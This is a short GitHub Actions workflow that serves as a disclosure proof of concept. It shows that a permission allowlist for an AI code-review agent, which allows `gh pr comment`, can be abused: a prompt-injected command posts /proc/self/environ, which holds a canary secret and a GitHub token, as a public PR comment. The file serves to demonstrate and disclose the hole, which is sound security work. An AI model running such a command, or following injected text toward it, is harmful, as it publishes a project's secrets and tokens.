# Demonstrates that `gh pr comment <n> --body-file <path>` (the exact command shape
# permitted by Uniswap/docs claude-code-review.yml's Bash(gh pr comment:*)) reads an
# arbitrary local file and publishes it as a public PR comment.
name: gh-comment-fileread
on:
  workflow_dispatch:
    inputs:
      pr:
        description: PR number
        required: true
permissions:
  contents: read
  pull-requests: write
jobs:
  demo:
    runs-on: ubuntu-latest
    env:
      CANARY_SECRET: ${{ secrets.CANARY_SECRET }}
    steps:
      - name: emulate prompt-injected `gh pr comment <n> -F /proc/self/environ`
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR: ${{ inputs.pr }}
        run: |
          gh pr comment "$PR" --body-file /proc/self/environ
          echo "posted"
